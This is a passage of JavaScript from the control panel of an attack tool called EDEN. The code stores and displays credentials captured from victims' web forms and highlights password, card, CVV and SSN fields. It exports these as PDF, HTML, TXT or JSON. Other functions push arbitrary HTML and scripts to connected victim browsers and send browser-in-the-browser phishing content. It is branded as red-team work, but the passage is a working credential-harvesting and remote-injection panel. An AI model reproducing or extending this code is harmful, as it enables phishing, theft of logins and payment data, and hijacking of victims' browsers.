                    // If 75% of fields match, consider it a duplicate
                    return totalFields > 0 && (sameDataCount / totalFields) > 0.75;
                });
                
                if (isDuplicate) {
                    console.log('Skipping duplicate submission');
                    return;
                }
            } else {
                // Skip if no data at all
                return;
            }
            
                            // Create a credential object with timestamp
            const credential = {
                id: 'cred_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
                timestamp: credentialData.timestamp || new Date().toISOString(),
                url: credentialData.url || 'Unknown',
                formId: credentialData.formId || 'Unknown',
                clientId: credentialData.clientId || 'Unknown',
                ip: credentialData.ip || 'Unknown',
                source: credentialData.source || '',
                data: credentialData.data || {},
                formMetadata: credentialData.formMetadata || {}
            };
            
            // Add to beginning of array
            capturedCredentials.unshift(credential);
            
            // Limit to 50 entries
            if (capturedCredentials.length > 50) {
                capturedCredentials = capturedCredentials.slice(0, 50);
            }
            
            // Update UI and save
            updateCredentialsUI();
            saveCredentialsToStorage();
        }
        
        // Clear all credentials
        function clearAllCredentials() {
            if (confirm('Are you sure you want to clear all captured credentials?')) {
                capturedCredentials = [];
                updateCredentialsUI();
                saveCredentialsToStorage();
            }
        }
        
        // Get all selected credential IDs
        function getSelectedCredentials() {
            const selectedCheckboxes = document.querySelectorAll('.credential-select-checkbox:checked');
            const selectedIds = Array.from(selectedCheckboxes).map(checkbox => {
                const cardId = checkbox.id.replace('select-', '');
                return cardId;
            });
            
            return selectedIds;
        }
        
        // Update export button state
        function updateExportButtonState() {
            const selectedCount = document.querySelectorAll('.credential-select-checkbox:checked').length;
            const exportBtn = document.getElementById('exportCredentialsBtn');
            
            if (exportBtn) {
                if (selectedCount > 0) {
                    exportBtn.innerHTML = `<i class="fas fa-file-export" style="margin-right: 5px;"></i> Export (${selectedCount})`;
                } else {
                    exportBtn.innerHTML = `<i class="fas fa-file-export" style="margin-right: 5px;"></i> Export All`;
                }
            }
        }
        
       
        // Create PDF export
        function exportAsPdf(credentials) {
            // We'll need to load the jsPDF library
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
            script.onload = function() {
                const script2 = document.createElement('script');
                script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js';
                script2.onload = generatePDF;
                document.head.appendChild(script2);
            };
            document.head.appendChild(script);
            
            function generatePDF() {
                try {
                    const { jsPDF } = window.jspdf;
                    const doc = new jsPDF();
                    
                    // Title
                    doc.setFontSize(16);
                    doc.text("Eden Credentials Export", 14, 15);
                    
                    // Add timestamp
                    const timestamp = new Date().toLocaleString();
                    doc.setFontSize(10);
                    doc.text(`Generated: ${timestamp}`, 14, 22);
                    
                    // Loop through each credential and add to the PDF
                    let yPos = 30;
                    
                    credentials.forEach((cred, index) => {
                        // Check if we need a new page
                        if (yPos > 250) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        // Add credential header
                        doc.setFontSize(12);
                        doc.setTextColor(44, 62, 80);
                        doc.text(`Credential #${index + 1}`, 14, yPos);
                        yPos += 7;
                        
                        // Add timestamp
                        doc.setFontSize(10);
                        doc.setTextColor(100, 100, 100);
                        let formattedDate;
                        try {
                            formattedDate = new Date(cred.timestamp).toLocaleString();
                        } catch (e) {
                            formattedDate = 'Unknown';
                        }
                        doc.text(`Captured: ${formattedDate}`, 14, yPos);
                        yPos += 5;
                        
                        // Add URL and client ID
                        doc.text(`URL: ${cred.url || 'Unknown'}`, 14, yPos);
                        yPos += 5;
                        doc.text(`Client ID: ${cred.clientId || 'Unknown'}`, 14, yPos);
                        yPos += 5;
                        doc.text(`IP: ${cred.ip || 'Unknown'}`, 14, yPos);
                        yPos += 8;
                        
                        // Add credential data
                        if (cred.data && Object.keys(cred.data).length > 0) {
                            // Create a table for the form data
                            const tableData = [];
                            for (const key in cred.data) {
                                tableData.push([key, cred.data[key] || '']);
                            }
                            
                            doc.autoTable({
                                startY: yPos,
                                head: [['Field', 'Value']],
                                body: tableData,
                                theme: 'striped',
                                headStyles: {
                                    fillColor: [52, 152, 219],
                                    textColor: [255, 255, 255]
                                },
                                margin: { left: 14, right: 14 },
                                styles: { fontSize: 10 }
                            });
                            
                            yPos = doc.previousAutoTable.finalY + 15;
                        } else {
                            yPos += 5;
                            doc.text("No credential data available", 14, yPos);
                            yPos += 15;
                        }
                        
                        // Add a separator
                        doc.setDrawColor(200, 200, 200);
                        doc.line(14, yPos - 8, 196, yPos - 8);
                    });
                    
                    // Save the PDF
                    const fileName = `eden_credentials.pdf`;
                    doc.save(fileName);
                    
                                    
                } catch (error) {
                    console.error('Error generating PDF:', error);
                    alert('Failed to generate PDF: ' + error.message);
                }
            }
        }
        
        // Create HTML export
        function exportAsHtml(credentials) {
    // Create HTML header
    let html = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EDEN Credentials Export</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #0066ff;
                --primary-light: #4d94ff;
                --secondary: #003380;
                --accent: #00ccff;
                --border: #99c2ff;
                --gray-50: #f9fafb;
                --gray-100: #f3f4f6;
                --gray-200: #e5e7eb;
                --gray-500: #6b7280;
                --gray-700: #374151;
                --gray-800: #1f2937;
            }
            
            * {margin: 0; padding: 0; box-sizing: border-box;}
            
            body {
                font-family: 'Poppins', sans-serif;
                line-height: 1.6;
                color: var(--gray-800);
                background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                width: 100%;
            }
            
            .container {max-width: 1200px; margin: 0 auto; padding: 2rem;}
            
            /* Header */
            .header {
                background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
                color: white;
                padding: 40px 0;
                position: relative;
                overflow: hidden;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                border-bottom: 1px solid gold;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0MCIgaGVpZ2h0PSI0MDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiIGlkPSJhIj48c3RvcCBzdG9wLWNvbG9yPSIjRkZGIiBzdG9wLW9wYWNpdHk9Ii4wNSIgb2Zmc2V0PSIwJSIvPjxzdG9wIHN0b3AtY29sb3I9IiNGRkYiIHN0b3Atb3BhY2l0eT0iLjEiIG9mZnNldD0iMTAwJSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGQ9Ik0wIDQwMFYyMDBzMTAwLTUwIDIwMC01MHMxMDAgNTAgMjAwIDUwIDEwMC01MCAyMDAtNTAgMTAwIDUwIDIwMCA1MCAxMDAtNTAgMjAwLTUwIDEwMCA1MCAyMDAgNTAgMTAwLTUwIDIwMC01MHYyMDBIMHoiIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZmlsbC1vcGFjaXR5PSIuNCIvPjwvc3ZnPg==') bottom center no-repeat;
                background-size: cover;
                opacity: 0.3;
                z-index: 0;
            }
            
            .header-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 30px;
                position: relative;
                z-index: 1;
                display: flex;
                justify-content: center;
            }
            
            .header-left {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            
            .logo-text h1 {
                font-size: 36px;
                font-weight: 700;
                margin: 0;
                letter-spacing: 1px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            .logo-text .tagline {
                font-size: 18px;
                opacity: 0.9;
                font-weight: 400;
                margin-top: 5px;
            }
            
            .header-subtitle {
                font-size: 1.2rem;
                margin-top: 15px;
                font-weight: 500;
            }
            
            .timestamp {
                display: inline-block;
                background-color: rgba(255, 255, 255, 0.2);
                padding: 8px 15px;
                border-radius: 50px;
                font-size: 14px;
                font-weight: 500;
                margin-top: 20px;
                backdrop-filter: blur(5px);
            }
            
            /* Credentials Section */
            .credentials-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
                gap: 30px;
                margin: 40px 0;
            }
            
            .credential-card {
                background-color: white;
                border-radius: 16px;
                box-shadow: 0 5px 15px rgba(0, 26, 64, 0.1);
                padding: 0;
                margin-bottom: 30px;
                border: 1px solid var(--border);
                overflow: hidden;
                transition: all 0.3s ease;
            }
            
            .credential-card:hover {transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0, 26, 64, 0.15);}
            
            .credential-header {
                margin-bottom: 25px;
                position: relative;
                padding: 20px 30px;
                border-bottom: 2px solid var(--primary-light);
                background-color: white;
            }
            
            .credential-title {
                font-size: 24px;
                font-weight: 600;
                color: var(--secondary);
                margin: 0;
                display: flex;
                align-items: center;
            }
            
            .credential-content {padding: 0 30px 30px;}
            
            .credential-metadata {
                background-color: var(--gray-50);
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 25px;
                border: 1px solid var(--gray-200);
            }
            
            .meta-item {
                display: flex;
                margin-bottom: 12px;
                align-items: flex-start;
            }
            
            .meta-item:last-child {margin-bottom: 0;}
            
            .meta-label {
                flex: 0 0 100px;
                font-weight: 600;
                color: var(--secondary);
            }
            
            .meta-value {
                flex: 1;
                color: var(--gray-700);
                word-break: break-word;
            }
            
            .data-section {margin-top: 25px;}
            
            .data-section h3 {
                font-size: 18px;
                margin-bottom: 15px;
                color: var(--secondary);
                padding-bottom: 8px;
                border-bottom: 2px solid var(--primary-light);
                display: inline-block;
            }
            
            .data-table {
                width: 100%;
                border-collapse: separate;
                border-spacing: 0;
                border-radius: 10px;
                overflow: hidden;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
            }
            
            .data-table th {
                background-color: var(--gray-100);
                text-align: left;
                padding: 15px;
                font-weight: 600;
                color: var(--secondary);
                font-size: 16px;
            }
            
            .data-table td {
                padding: 15px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-800);
                font-size: 15px;
            }
            
            .data-table tr:nth-child(even) td {background-color: var(--gray-50);}
            
            .data-table .field-name {
                font-weight: 600;
                width: 30%;
                color: var(--secondary);
            }
            
            /* Author & Footer */
            .author-info {
                display: flex;
                flex-direction: column;
                align-items: center;
                margin-top: 10px;
            }
            
            .author-details {text-align: center;}
            
            .author-name {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 5px;
                color: var(--secondary);
            }
            
            .author-role {
                font-size: 18px;
                color: var(--primary);
                margin-bottom: 15px;
            }
            
            .social-links {
                display: flex;
                gap: 15px;
                margin-top: 10px;
                justify-content: center;
            }
            
            .social-link {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: var(--primary-light);
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
                transition: all 0.3s ease;
                text-decoration: none;
            }
            
            .social-link:hover {
                background-color: white;
                color: var(--primary);
                transform: translateY(-3px);
            }
            
            .footer-container {
                background-color: white;
                color: var(--gray-800);
                padding: 15px 0;
                border-top: 1px solid var(--gray-200);
                width: 100%;
                box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
                left: 0;
                right: 0;
                position: relative;
            }
            
            .footer-content {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                gap: 10px;
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
            }
            
            .footer-text {
                text-align: center;
                font-size: 18px;
                color: var(--secondary);
            }
            
            .copyright {
                text-align: center;
                padding-top: 10px;
                margin-top: 10px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-500);
                font-size: 14px;
                width: 100%;
            }
            /* Responsive */
            @media (max-width: 1200px) {.credentials-grid {grid-template-columns: repeat(2, 1fr);}}
            
            @media (max-width: 768px) {
                .container {padding: 1rem;}
                .credentials-grid {grid-template-columns: 1fr;}
                .header-content {padding: 0 15px;}
                .logo-text h1 {font-size: 28px;}
                .credential-content {padding: 0 20px 20px;}
                .credential-header {padding: 15px 20px;}
            }
        </style>
    </head>
    <body>
        <header class="header">
            <div class="header-content">
                <div class="header-left">
                    <div class="logo-text">
                        <h1>EDEN</h1>
                        <div class="tagline">Exploit & Dynamic Execution Network</div>
                    </div>
                    <div class="header-subtitle">Credentials Export Report</div>
                    <div class="timestamp">Generated: <span id="current-date">${new Date().toLocaleString()}</span></div>
                </div>
            </div>
        </header>
        
        <div class="container">
            <div class="credentials-grid">`;
                
                credentials.forEach((cred, index) => {
                    // Format timestamp
                    let formattedDate;
                    try {
                        formattedDate = new Date(cred.timestamp).toLocaleString();
                    } catch (e) {
                        formattedDate = 'Unknown';
                    }
                    
                    html += `
                    <div class="credential-card">
                        <div class="credential-header">
                            <h2 class="credential-title">Credential #${index + 1}</h2>
                        </div>
                        <div class="credential-content">
                            <div class="credential-metadata">
                                <div class="meta-item">
                                    <div class="meta-label">Captured:</div>
                                    <div class="meta-value">${formattedDate}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">URL:</div>
                                    <div class="meta-value">${cred.url || 'Unknown'}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">Client ID:</div>
                                    <div class="meta-value">${cred.clientId || 'Unknown'}</div>
                                </div>
                                <div class="meta-item">
                                    <div class="meta-label">IP:</div>
                                    <div class="meta-value">${cred.ip || 'Unknown'}</div>
                                </div>
                            </div>`;
                        
                    if (cred.data && Object.keys(cred.data).length > 0) {
                        html += `
                        <div class="data-section">
                            <h3>Form Data</h3>
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Field</th>
                                        <th>Value</th>
                                    </tr>
                                </thead>
                                <tbody>`;
                        
                        for (const key in cred.data) {
                            html += `
                                <tr>
                                    <td class="field-name">${key}</td>
                                    <td>${cred.data[key] || '<em style="color:var(--gray-400)">Empty</em>'}</td>
                                </tr>`;
                        }
                        
                        html += `
                                </tbody>
                            </table>
                        </div>`;
                    } else {
                        html += `
                        <div class="data-section">
                            <div style="text-align: center; padding: 30px 0; color: var(--gray-500);">
                                <div style="font-size: 3rem; margin-bottom: 10px;">📝</div>
                                <p>No credential data available</p>
                            </div>
                        </div>`;
                    }
                    
                    html += `</div>
                    </div>`;
                });
                
                html += `
                </div>
            </div>`;
                
                // Add footer without breaking the template literal
                html += `
            <div class="footer-container">
                <div class="footer-content">
                    <div class="footer-text">
                        <p>Exported from EDEN</p>
                    </div>
                    <div class="author-info">
                        <div class="author-details">
                            <div class="author-name">Varun</div>
                            <div class="author-role">Red Teamer | Web Penetration Tester | Ethical Hacker</div>
                            <div class="social-links">
                                <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                                    <i class="fab fa-linkedin-in"></i>
                                </a>
                                <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                                    <i class="fab fa-github"></i>
                                </a>
                                <a href="#" class="social-link" title="Twitter">
                                    <i class="fab fa-twitter"></i>
                                </a>
                                <a href="#" class="social-link" title="Discord">
                                    <i class="fab fa-discord"></i>
                                </a>
                                <a href="#" class="social-link" title="Instagram">
                                    <i class="fab fa-instagram"></i>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="copyright">
                        <p>© ${new Date().getFullYear()} EDEN Security | Developed by Varun</p>
                    </div>
                </div>
            </div>
            
           
        </body>
        </html>`;
                
            // Create blob and download
            const blob = new Blob([html], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.html`;
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${credentials.length} credential records to HTML`);
        }
        
        // Create TXT export
        function exportAsTxt(credentials) {
            let text = `Eden Credentials Export
Generated: ${new Date().toLocaleString()}

`;
            
            credentials.forEach((cred, index) => {
                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                text += `==== Credential #${index + 1} ====\n`;
                text += `Captured: ${formattedDate}\n`;
                text += `URL: ${cred.url || 'Unknown'}\n`;
                text += `Client ID: ${cred.clientId || 'Unknown'}\n`;
                text += `IP: ${cred.ip || 'Unknown'}\n\n`;
                
                if (cred.data && Object.keys(cred.data).length > 0) {
                    text += `Form Data:\n`;
                    for (const key in cred.data) {
                        text += `  ${key}: ${cred.data[key] || ''}\n`;
                    }
                } else {
                    text += `No credential data available\n`;
                }
                
                text += `\n\n`;
            });
            
            // Create blob and download
            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.txt`;
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${credentials.length} credential records to TXT`);
        }
        
        // Create JSON export
        function exportAsJson(credentials) {
            // Format data for better readability
            const exportData = credentials.map(cred => {
                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                return {
                    ...cred,
                    formattedTimestamp: formattedDate
                };
            });
            
            // Create JSON file
            const jsonStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = url;
            downloadLink.download = `eden_credentials.json`;
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            // Clean up URL
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);
            
            // Show success message
            alert(`Successfully exported ${exportData.length} credential records to JSON`);
        }
        
        // Export credentials function
        function exportAllCredentials() {
            const selectedIds = getSelectedCredentials();
            
            // Determine which credentials to export
            let credentialsToExport;
            if (selectedIds.length > 0) {
                // Export only selected credentials
                credentialsToExport = capturedCredentials.filter(cred => 
                    selectedIds.includes(cred.id)
                );
            } else {
                // Export all if none selected
                credentialsToExport = [...capturedCredentials];
            }
            
            if (credentialsToExport.length === 0) {
                alert('No credentials to export');
                return;
            }
            
            try {
                // Get selected format
                const formatSelect = document.getElementById('exportFormatSelect');
                const format = formatSelect ? formatSelect.value : 'json';
                
                // Export in the selected format
                switch(format) {
                    case 'pdf':
                        exportAsPdf(credentialsToExport);
                        break;
                    case 'html':
                        exportAsHtml(credentialsToExport);
                        break;
                    case 'txt':
                        exportAsTxt(credentialsToExport);
                        break;
                    case 'json':
                    default:
                        exportAsJson(credentialsToExport);
                        break;
                }
                
                
                
            } catch (error) {
                console.error('Error exporting credentials:', error);
                alert('Failed to export credentials: ' + error.message);
            }
        }
        
        // Update credentials UI
        function updateCredentialsUI() {
            const credentialsList = document.getElementById('credentialsList');
            const emptyState = document.getElementById('credentialsEmptyState');
            
            if (!credentialsList || !emptyState) return;
            
            // Clear existing cards
            credentialsList.innerHTML = '';
            
            // Show empty state if no credentials
            if (capturedCredentials.length === 0) {
                emptyState.style.display = 'block';
                credentialsList.style.display = 'none';
                return;
            }
            
            // Hide empty state and show credentials
            emptyState.style.display = 'none';
            credentialsList.style.display = 'grid';
            credentialsList.style.gridTemplateColumns = 'repeat(auto-fill, minmax(400px, 1fr))';
            credentialsList.style.gap = '20px';
            credentialsList.style.marginTop = '20px';
            
            // Add each credential
            capturedCredentials.forEach(cred => {
                // Create card similar to client cards in connection section
                const card = document.createElement('div');
                card.className = 'client-card credential-card';
                card.id = `credential-${cred.id}`;
                card.setAttribute('data-cred-id', cred.id);
                card.style.position = 'relative';
                card.style.cursor = 'pointer';
                
                // Add selection checkbox and indicator
                const checkbox = document.createElement('input');
                checkbox.type = 'checkbox';
                checkbox.className = 'credential-select-checkbox';
                checkbox.id = `select-${cred.id}`;
                checkbox.addEventListener('change', function() {
                    if (this.checked) {
                        card.classList.add('selected');
                    } else {
                        card.classList.remove('selected');
                    }
                    updateExportButtonState();
                });
                
                const indicator = document.createElement('div');
                indicator.className = 'credential-select-indicator';
                
                card.appendChild(checkbox);
                card.appendChild(indicator);
                
                // Handle credential card clicks based on selection mode
                card.addEventListener('click', function(e) {
                    // Check if selection mode is active
                    const selectionModeActive = document.getElementById('selectionModeToggle') && 
                                              document.getElementById('selectionModeToggle').checked;
                    
                   
                    // In normal mode, the default behavior will occur (drawer opens)
                });
                

                // Format timestamp
                let formattedDate;
                try {
                    formattedDate = new Date(cred.timestamp).toLocaleString();
                } catch (e) {
                    formattedDate = 'Unknown';
                }
                
                // Create IP display and header like client cards
                let header = `
                    <div class="client-ip">
                        <i class="fas fa-network-wired"></i>
                        ${cred.ip || 'Unknown IP'}
                        <span class="client-status status-online"></span>
                    </div>
                    <div style="display: flex; align-items: center; margin: 10px 0;">
                        <span class="status-text online-text">Captured</span>
                        <span style="font-size: 0.7rem; margin-left: 10px; color: #64748b;">${formattedDate}</span>
                    </div>
                `;
                
                // Add View Data button
                header += `
                    <div class="client-actions" style="margin-top: 0.5rem;">
                        <button class="select-btn" data-credid="${cred.id}">
                            <i class="fas fa-eye"></i> View Data
                        </button>
                    </div>
                    <div id="details-${cred.id}" class="client-details">
                        <div class="details-grid">
                            <div class="detail-item">
                                <span class="detail-label">Client:</span>
                                <span>${cred.clientId || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">URL:</span>
                                <span>${cred.url || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Time:</span>
                                <span>${formattedDate}</span>
                            </div>
                            ${cred.source ? `
                            <div class="detail-item">
                                <span class="detail-label">Source:</span>
                                <span>${cred.source}</span>
                            </div>` : ''}
                        </div>
                `;
                
                // Add credential data
                let content = '<div style="margin-top: 15px;">';
                
                // Add form metadata if available
                if (cred.formMetadata && Object.keys(cred.formMetadata).length > 0) {
                    content += '<h4 style="margin-bottom: 10px; color: var(--primary-dark); font-size: 1rem;">Form Metadata</h4>';
                    content += '<div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">';
                    
                    // Add form type badges
                    if (cred.formMetadata.hasPassword) {
                        content += '<span style="background-color: #e53e3e; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Password Form</span>';
                    }
                    if (cred.formMetadata.hasEmail) {
                        content += '<span style="background-color: #3182ce; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Email Form</span>';
                    }
                    if (cred.formMetadata.formMethod) {
                        content += `<span style="background-color: #718096; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">Method: ${cred.formMetadata.formMethod.toUpperCase()}</span>`;
                    }
                    if (cred.formMetadata.inputCount) {
                        content += `<span style="background-color: #38a169; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px;">${cred.formMetadata.inputCount} Fields</span>`;
                    }
                    if (cred.formMetadata.formAction) {
                        content += `<div style="width: 100%; margin-top: 5px; font-size: 12px; color: #4a5568; word-break: break-all;">Action: ${cred.formMetadata.formAction}</div>`;
                    }
                    
                    content += '</div>';
                }
                
                content += '<h4 style="margin-bottom: 10px; color: var(--primary-dark); font-size: 1rem;">Form Data</h4>';
                content += '<table style="width: 100%; border-collapse: collapse;">';
                content += '<thead><tr style="border-bottom: 1px solid var(--border);">';
                content += '<th style="text-align: left; padding: 8px; color: var(--dark);">Field</th>';
                content += '<th style="text-align: left; padding: 8px; color: var(--dark);">Value</th>';
                content += '</tr></thead><tbody>';
                
                // Add each field
                if (cred.data && typeof cred.data === 'object') {
                    const credentialFields = ['username', 'password', 'email', 'pass', 'name', 'login', 'user', 'account', 'id', 'token', 'auth', 'key', 'secret', 'credential', 'phone', 'mobile', 'card', 'credit', 'cvv', 'ssn', 'social', 'birth', 'address'];
                    
                    Object.entries(cred.data).forEach(([key, value]) => {
                        // Check if this is a credential field
                        const isCredential = credentialFields.some(field => 
                            key.toLowerCase().includes(field)
                        );
                        
                        // Check if this is a password field by value pattern (e.g., contains * or •)
                        const isPasswordValue = typeof value === 'string' && 
                            (value.match(/^[\*\•]+$/) || 
                             (key.toLowerCase().includes('pass') && value.length > 0));
                        
                        // Highlight credential fields
                        let rowStyle = '';
                        let keyStyle = '';
                        
                        if (isCredential) {
                            rowStyle = 'background-color: rgba(0, 102, 255, 0.05);';
                            keyStyle = 'font-weight: 600; color: var(--primary-dark);';
                        }
                        
                        if (isPasswordValue) {
                            rowStyle = 'background-color: rgba(220, 38, 38, 0.05);';
                            keyStyle = 'font-weight: 600; color: #dc2626;';
                        }
                        
                        content += `<tr style="border-bottom: 1px solid rgba(153, 194, 255, 0.2); ${rowStyle}">`;
                        content += `<td style="padding: 8px; ${keyStyle}">${key}</td>`;
                        content += `<td style="padding: 8px;">${value}</td>`;
                        content += '</tr>';
                    });
                } else {
                    content += '<tr><td colspan="2" style="padding: 8px;">No data available</td></tr>';
                }
                
                content += '</tbody></table></div></div>';
                
                // Set card content
                card.innerHTML = header + content;
                
                // Add card to list
                credentialsList.appendChild(card);
                
                // Add click event to toggle details
                card.addEventListener('click', function() {
                    // Toggle this credential's details independently
                    const details = document.getElementById(`details-${cred.id}`);
                    details.classList.toggle('show');
                    
                    // Update the button text
                    const button = this.querySelector('.select-btn');
                    if (details.classList.contains('show')) {
                        button.innerHTML = '<i class="fas fa-eye-slash"></i> Hide Data';
                    } else {
                        button.innerHTML = '<i class="fas fa-eye"></i> View Data';
                    }
                });
                
                // Add click event to view button
                const viewBtn = card.querySelector('.select-btn');
                if (viewBtn) {
                    viewBtn.addEventListener('click', function(e) {
                        e.stopPropagation();
                        const details = document.getElementById(`details-${cred.id}`);
                        const showing = details.classList.toggle('show');
                        
                        // Update button text
                        this.innerHTML = showing ? 
                            '<i class="fas fa-eye-slash"></i> Hide Data' : 
                            '<i class="fas fa-eye"></i> View Data';
                    });
                }
            });
        }
        
        function saveToLocalStorage() {
            localStorage.setItem('files', JSON.stringify(Array.from(fileStorage.entries())));
        }
        
        function handleFile(file) {
            const validTypes = ['html', 'js', 'mhtml', 'css'];
            const fileExt = file.name.split('.').pop().toLowerCase();
            if (!validTypes.includes(fileExt)) {
                alert('Please upload HTML, JS, MHTML, or CSS files');
                return;
            }
            const reader = new FileReader();
            reader.onload = function(event) {
                fileStorage.set(file.name, {
                    name: file.name,
                    type: file.type,
                    size: file.size,
                    data: event.target.result,
                    extension: fileExt
                });
                latestFileName = file.name;
                if (fileExt === 'html') {
                    currentHtmlContent = event.target.result;
                }
                updateFileInfo(file);
                updateFileList();
                saveToLocalStorage();
            };
            reader.readAsText(file);
        }

        function updateFileInfo(file) {
            const fileInfo = document.getElementById('fileInfo');
            const fileData = fileStorage.get(file.name);
            if (fileData) {
                fileInfo.innerHTML = `
                    <p><strong>File Name:</strong> ${file.name}</p>
                    <p><strong>File Type:</strong> ${file.type || 'text/' + file.name.split('.').pop()}</p>
                    <p><strong>Size:</strong> ${formatFileSize(file.size)}</p>
                `;
            } else {
                fileInfo.innerHTML = '<p>No file selected</p>';
            }
        }
        
        function executeCode() {
            const code = codeInput.value;
            if (!code.trim()) return;
            let htmlContent = '';
            let cssContent = '';
            let jsContent = '';
            const htmlMatch = code.match(/<html[^>]*>([\s\S]*)<\/html>/i);
            const styleMatch = code.match(/<style[^>]*>([\s\S]*)<\/style>/ig);
            const scriptMatch = code.match(/<script[^>]*>([\s\S]*)<\/script>/ig);
            
            if (htmlMatch) {
                htmlContent = code;
                currentHtmlContent = code;
            } else {
                htmlContent = `<html><body>${code}</body></html>`;
                currentHtmlContent = htmlContent;
            }
            
            if (styleMatch) {
                cssContent = styleMatch.map(style => {
                    const content = style.match(/<style[^>]*>([\s\S]*)<\/style>/i);
                    return content ? content[1] : '';
                }).join('\n');
            }
            
            if (scriptMatch) {
                jsContent = scriptMatch.map(script => {
                    const content = script.match(/<script[^>]*>([\s\S]*)<\/script>/i);
                    return content ? content[1] : '';
                }).join('\n');
            }
            
            // Get reload toggle state
            const shouldReload = document.getElementById('displayReloadToggle').checked;
            
            // Send the content to selected clients or all if none selected
            sendToSelectedClients({
                type: 'executeContent',
                content: htmlContent,
                fileName: 'editor.html',
                resources: {
                    css: cssContent ? [cssContent] : [],
                    js: jsContent ? [jsContent] : []
                },
                reload: shouldReload
            });
        }
        
        function viewEditorContent() {
            const code = codeInput.value;
            if (!code.trim()) return;
            sendToSelectedClients({
                type: 'showsContent',
                content: code,
                fileName: 'editor.html',
                resources: {}
            });
        }
        
        function BITBEditorContent() {
            const code = codeInput.value;
            if (!code.trim()) return;
            sendToSelectedClients({
                type: 'BITBContent',
                content: code,
                fileName: 'editor.html'
            });
        }
        
        function BITBFile(fileName) {
            const fileData = fileStorage.get(fileName);
            if (!fileData) return;
            sendToSelectedClients({
                type: 'BITBContent',
                content: fileData.data,
                fileName: fileName
            });
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }       
        
        function clearUploadedData() {
